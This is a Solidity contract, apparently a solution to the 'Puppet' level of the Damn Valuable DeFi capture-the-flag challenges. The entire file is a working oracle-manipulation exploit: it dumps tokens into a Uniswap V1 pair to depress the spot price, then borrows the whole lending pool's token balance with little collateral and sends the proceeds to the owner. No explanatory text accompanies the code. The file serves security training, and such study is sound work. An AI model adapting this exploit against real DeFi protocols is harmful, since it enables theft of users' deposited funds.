// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface UniSwapV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns (uint256);
    function getTokenToEthInputPrice(uint256 tokens_sold) external returns(uint256);
}

contract PuppetAttack is Ownable{
    UniSwapV1 public  uniSwapV1;
    DamnValuableToken public immutable token;
    PuppetPool puppetPool;

    constructor(address tokenAddress, address uniswapPairAddress, address puppetPoolAddress) Ownable(){
        token = DamnValuableToken(tokenAddress);
        uniSwapV1 = UniSwapV1(uniswapPairAddress);
        puppetPool = PuppetPool(puppetPoolAddress);
    }

    function start() public payable onlyOwner {
        // allowance[address(this)][address(this)] ???
//        token.approve(address(this), type(uint256).max);
//        token.transferFrom(msg.sender, address(this), amount);
        // for gt ethers.utils.parseEther('100000')
        uint amount = token.balanceOf(address(this)) - 1;
        token.approve(address(uniSwapV1), type(uint256).max);
        uint ethReturn = uniSwapV1.tokenToEthTransferInput(amount, 1, block.timestamp * 2, msg.sender);
        uint borrowTokenAmount = token.balanceOf(address(puppetPool));
        uint ethAmountRequired = puppetPool.calculateDepositRequired(borrowTokenAmount);
        require(msg.value >= ethAmountRequired, "Attack: dont have enough eth");
        puppetPool.borrow{value: ethAmountRequired}(borrowTokenAmount);
        withdrawAll();
    }

    function withdrawAll() private {
        payable(owner()).transfer(address(this).balance);
        token.transfer(owner(), token.balanceOf(address(this)));
    }

    receive() external payable {}
}
